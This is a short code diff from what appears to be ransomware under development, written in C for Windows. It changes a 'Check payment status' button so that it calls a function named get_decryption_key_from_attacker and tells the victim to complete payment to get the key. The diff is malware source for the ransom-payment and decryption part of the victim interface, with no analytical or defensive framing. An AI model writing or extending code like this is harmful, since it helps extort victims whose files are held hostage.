@@ -1,4 +1,5 @@
 #include "attack_decrypt.h"
+#include "attack_web.h"
 
 #include <windows.h>
 #include <commctrl.h>
@@ -263,7 +264,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         switch (LOWORD(wParam))
         {
         case 1:
-            MessageBox(hwnd, "You clicked Check payment status!", "Info", MB_OK | MB_ICONINFORMATION);
+            if (get_decryption_key_from_attacker() != 0) {
+                MessageBox(hwnd, "Please complete the payment to obtain the key. \r\n Note: the payment is registered after abount 1 hour.", "Info", MB_OK | MB_ICONINFORMATION);
+            } else {
+                MessageBox(hwnd, "Ready for decryption!", "Info", MB_OK | MB_ICONINFORMATION);
+            }
             SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)"Check clicked");
             break;
 
